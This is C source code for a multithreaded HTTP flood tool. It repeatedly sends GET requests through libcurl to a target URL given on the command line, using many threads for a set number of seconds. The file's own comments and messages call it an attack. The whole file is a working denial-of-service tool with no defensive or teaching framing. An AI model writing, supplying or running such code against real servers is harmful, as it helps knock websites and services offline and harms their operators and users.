#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <curl/curl.h>
#include <vector>

// Global flag to stop the attack gracefully
volatile int running = 1;

// Signal handler to stop the attack
void handle_sigint(int sig) {
    printf("\nStopping attack...\n");
    running = 0;
}

// Thread function to perform the HTTP flood
void *http_flood(void *arg) {
    char *url = (char *)arg;
    CURL *curl;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_ALL); // Initialize CURL globally
    curl = curl_easy_init(); // Initialize a CURL handle

    if (!curl) {
        fprintf(stderr, "Failed to initialize CURL\n");
        pthread_exit(NULL);
    }

    curl_easy_setopt(curl, CURLOPT_URL, url); // Set the target URL
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L); // Follow redirects

    while (running) {
        res = curl_easy_perform(curl); // Perform the HTTP GET request
        if (res != CURLE_OK) {
            fprintf(stderr, "CURL error: %s\n", curl_easy_strerror(res));
        } else {
            printf("Request sent to %s\n", url);
        }
        usleep(100000); // Slight delay between requests (optional)
    }

    curl_easy_cleanup(curl); // Cleanup CURL handle
    pthread_exit(NULL);
}

void usage() {
    printf("Usage: ./http_flood url threads duration\n");
    exit(1);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        usage();
    }

    char *url = argv[1];
    int threads = atoi(argv[2]);
    int duration = atoi(argv[3]);

    pthread_t thread_ids[threads];

    signal(SIGINT, handle_sigint); // Handle Ctrl+C gracefully

    printf("Starting HTTP flood attack on %s with %d threads for %d seconds\n", url, threads, duration);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, http_flood, (void *)url) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
        printf("Launched thread %d\n", i + 1);
    }

    sleep(duration); // Run the attack for the specified duration
    running = 0; // Stop all threads

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    printf("HTTP flood attack finished\n");
    return 0;
}
